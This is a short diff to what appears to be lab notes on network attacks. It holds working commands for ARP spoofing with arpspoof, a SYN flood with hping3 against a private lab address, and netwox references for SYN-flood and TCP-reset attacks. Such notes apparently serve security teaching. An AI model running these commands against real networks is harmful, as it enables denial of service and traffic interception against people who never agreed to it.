@@ -21,6 +21,14 @@ Install arpspoof with sudo apt-get install dsniff
 Execute ARP Spoofing attack with command:
 sudo arpspoof -i eth1 -t 192.168.255.22 192.168.255.33 & > /dev/null
 
+SYN-Flood Attack
+netwox 76
+Install hping3 with sudo apt-get install hping3
+sudo hping3 -p 23 -I eth1 --flood 192.168.255.33
+
+TCP-Reset Attack
+netwox 78
+
 
 # Install ettercap (both gtk and text-only)
 # Execute ARP Spoofing attack with command:
